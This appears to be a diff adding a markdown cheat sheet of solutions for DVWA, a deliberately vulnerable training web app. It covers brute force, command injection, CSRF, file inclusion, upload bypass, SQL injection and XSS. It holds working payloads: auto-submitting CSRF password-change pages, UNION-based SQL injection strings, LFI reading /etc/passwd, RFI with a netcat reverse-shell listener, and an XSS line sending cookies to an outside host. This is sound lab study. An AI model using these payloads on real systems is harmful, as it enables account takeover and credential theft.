@@ -1,0 +1,230 @@
+DVWA Solutions
+
+# 1 Brute Force
+
+## Low
+
+Step 1: Fuzz with comman password using ZAP
+
+## Medium
+
+Step 1: Throttle requests to 5 or 10 seconds
+
+## High
+
+Step 1: Unhide the CSRF Token
+
+Step 2: Send Login request to Intruder
+
+Step 3: Choose Attack Tye as Pitchfork and add Payload Marker to Token and Password field
+
+Step 4: Choose Payload Type 1 to Recursive grep and Payload Type 2 to Simple List
+
+Step 5: Go to Grep Extract and click on Add button, now select the Hidden CSRF Token from response.
+
+Step 6: Now select Start at offset radio button and End at fixed length radio button and click OK
+
+Step 7: Now in the Redirection section select the ALways radio button to follow the redirection automatically
+
+Step 8: Start the attack
+
+
+# 2 Command Injection
+
+## Low
+
+Step 1: Input <IP> && <Command>
+
+## Medium
+
+Step 1: Input <IP> & <Command>
+
+## High
+
+Step 1: Input <IP>|<Command>
+
+
+# 3 CSRF
+
+## Low
+
+Step 1: Edit the password fields and submit the request
+
+## Medium
+
+Step 1: Create a POC (Referrer header is being verified)
+
+<html>
+    <body>
+        <form action="https://web.com/appname/vulnerabilities/csrf/" method="GET">
+            <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="test123">
+            <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="test123">
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+Stored XSS can be used to change password (img src=Change Password URL)
+
+## High
+
+<html>
+ <body>
+  <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
+  <iframe id="myFrame" src="http://10.6.66.42/dvwa/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
+  <script>
+   function maliciousPayload() {
+    console.log("start");
+    var iframe = document.getElementById("myFrame");
+    var doc = iframe.contentDocument  || iframe.contentWindow.document;
+    var token = doc.getElementsByName("user_token")[0].value;const http = new XMLHttpRequest();
+    const url = "http://10.6.66.42/dvwa/vulnerabilities/csrf/?password_new=hackerman&password_conf=hackerman&Change=Change&user_token="+token+"#";
+    http.open("GET", url);
+    http.send();
+    console.log("password changed");
+   }
+  </script>
+ </body>
+</html>
+
+Check for IDOR first
+
+Step 1: Upload above file and send the link of the file to victim
+
+
+# File Inclusion
+
+## Low
+
+### LFI
+
+Step 1: Change file name
+
+Step 2: Try with ../../directory/file.php
+
+### RFI
+
+Step 1: Host reverse shell using SimpleHTTPServer
+
+Step 2: Start netcat at port 1337 (nc -nlvp 1337)
+
+Step 3: page=https://server.com/directory/file.php
+
+## Medium
+
+### LFI
+
+Step 1: Try with ....//....//directory/file.php
+
+### RFI
+
+Step 1: Host reverse shell using SimpleHTTPServer
+
+Step 2: Start netcat at port 1337 (nc -nlvp 1337)
+
+Step 3: page=hTtPs://server.com/directory/file.php or httpshttps://server.com/directory/file.php
+
+## High
+
+### LFI
+
+Step 1: Try with file:///etc/passwd
+
+### RFI
+
+Step 1: LFI the shell file:///dir/shell.php
+
+
+# 5 File Upload
+
+## Low
+
+Step 1: Simply upload the file
+
+## Medium
+
+Step 1: Change Content-Type to image/jpeg
+
+## High
+
+Step 1: Check for the image signatures in wikipedia
+
+Step 2: Create a malicious file
+
+Step 3: Add the bytes required (Usually 8 Spaces)
+
+Step 4: Open .png file in Hex Editor and update the initial bytes (89 50 4E 47 0D 0A 1A 0A) and save the file
+
+Tip 1: Try with adding null byte file.php%00.jpg
+
+Tip 2: Add code in EXIF data
+
+
+# 6 Insecure Captcha
+
+## Low
+
+Step 1: Force browse and change password from step 2 (page 2)
+
+## Medium
+
+Step 1: Force browse and change password from step 2 (page 2) by changing the value of passed_captcha=true
+
+## High
+
+Step 1: Check for comments in page source
+
+Step 2: Change User-Agent to reCAPTCHA and g-recaptcha-response to hidd3n_valu3
+
+
+# 7 SQL Injection
+
+## Low
+
+Step 1: Input 
+        1' or '1' = '1
+
+Step 2: Input 
+        1' or '1' = '1 UNION SELECT user, password FROM users#
+
+Step 3: a' UNION SELECT user, password;--
+
+## Medium
+
+Step 1: 1 or 1=1 UNION SELECT user, password FROM users#
+
+Step 2: a UNION SELECT 1, 2;--
+
+## High
+
+Step 1: Same as Low Level
+
+
+# 8 Blind SQL Injection
+
+## Low
+
+Step 1: Input 1' and sleep(5)#
+
+## Medium
+
+Step 1: Send 1+and+sleep+5 using ZAP
+
+## High
+
+Step 1: URL Encode Input 1' and sleep(5)# and send
+
+
+
+IN CSP first include externally then nonce
+in JS unhide field (rot13 to md5) and generate token using console in med do_something("XXphraseXX") copy the token and paste
+
+XSS Ref Med: <scr<script>ipt>alert(1)</script> High: <img src/onerror=alert(1)>
+
+<script>window.location="http://web:port/?cookie="+document.cookie</script> 
+
+<a onclick="alert(1)">test</a> XSS Stored High rest as Reflected
+
+</select><img src/onerror=alert(1)> (for DOM XSS)
